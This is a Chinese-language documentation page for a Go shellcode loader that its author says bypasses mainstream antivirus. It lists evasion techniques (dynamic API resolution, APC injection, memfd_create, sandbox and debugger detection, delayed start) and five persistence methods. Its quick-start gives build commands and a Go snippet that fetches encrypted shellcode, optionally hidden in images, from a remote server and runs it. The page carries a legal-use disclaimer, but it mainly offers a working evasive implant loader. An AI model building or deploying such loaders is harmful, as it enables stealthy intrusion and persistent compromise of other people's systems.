# Shellcode Executor

[Shellcode Executor](https://github.com/starnotes-xj/Shellcode-Executor) 是由本手册作者开发的跨平台 Shellcode 执行框架，Go 语言编写，支持 Windows 和 Linux，专注于安全研究与 CTF 实战场景。目前可绕过国内外主流杀毒软件检测。

[![GitHub](https://img.shields.io/badge/GitHub-starnotes--xj%2FShellcode--Executor-181717?style=plastic&logo=github&logoColor=white)](https://github.com/starnotes-xj/Shellcode-Executor)
[![License](https://img.shields.io/badge/License-MIT-green?style=plastic)](https://github.com/starnotes-xj/Shellcode-Executor)

!!! warning "仅限合法用途"
    本工具**仅用于**授权范围内的安全研究、CTF 比赛、渗透测试教学。严禁用于未授权入侵或任何违法活动。

---

## 核心特性

**免杀技术**

- **动态 API 解析**（Windows）：通过 PEB 遍历在运行时解析 ntdll/kernel32 函数地址，不留导入表痕迹，规避静态扫描
- **多种执行方式**：Windows 支持堆内存分配、APC 注入、回调函数执行；Linux 使用 `memfd_create`（规避 W^X 策略）+ mmap/mprotect

**Shellcode 加载**

- **AES-256-GCM 多轮加密**：Shellcode 加密后托管在远程服务器，运行时下载解密执行，本体不含明文 payload
- **LSB 图片隐写**：支持将加密 Shellcode 藏入 PNG/JPEG 图片中，以图片 URL 的形式下载，进一步降低特征
- **PBKDF2 密钥派生**：加密密码与实际密钥分离，暴力破解难度高

**对抗分析**

- **环境检测**：Windows 检测 PEB.BeingDebugged、NtGlobalFlag、沙箱模块；Linux 检测 ptrace/TracerPid、Docker/LXC 容器、DMI 虚拟机标志
- **延迟启动**：程序启动后延迟 60 秒执行，绕过沙箱的时间限制扫描

**持久化**

| 平台 | 方法 |
|---|---|
| Windows | GUID 随机名 + 注册表 `HKCU\...\Run` |
| Linux | 隐藏目录副本 / systemd 用户服务 / cron @reboot / bashrc / autostart（5 种） |

---

## 快速上手

完整流程：**加密 Shellcode → 改主程序密钥和 URL → 编译**

### 第一步：加密 Shellcode

```bash
cd cmd/encrypt

# 加密为 Base64 文件（10 轮，密码自定）
go run . --base64 shellcode.txt 10
# 输出 shellcode.txt.enc.b64，上传到 HTTP 服务器备用
```

仓库内置测试 payload：
- `test_windows.txt`：弹出计算器 `calc.exe`
- `test_linux.txt`：在 `/tmp/` 创建 `shellcode_ok` 文件

### 第二步：修改主程序

打开 `main_windows.go` 或 `main_linux.go`，填入远程 URL 和解密密码：

```go
url := "https://your-server/shellcode.enc.b64"
shellcode, err := loadShellcode(url, []byte("your_password"))
```

> 密码必须与加密时一致，不匹配会报 `解密失败: 第 N 轮解密失败`。

如需使用隐写图片，将 URL 改为 `.png` 或 `.jpg` 后缀，程序会自动从图片中提取并解密。

### 第三步：编译

```bash
# 编译 Windows 版本
GOOS=windows GOARCH=amd64 go build -o shellcode_executor.exe

# 编译 Linux 版本
GOOS=linux GOARCH=amd64 go build -o shellcode_executor

# 验证跨平台均可编译
GOOS=linux go build ./... && GOOS=windows go build ./...
```

### 清理持久化

```bash
# 自动清理（清除本程序安装的所有持久化项）
cd cmd/auto_cleaner && go run .
```
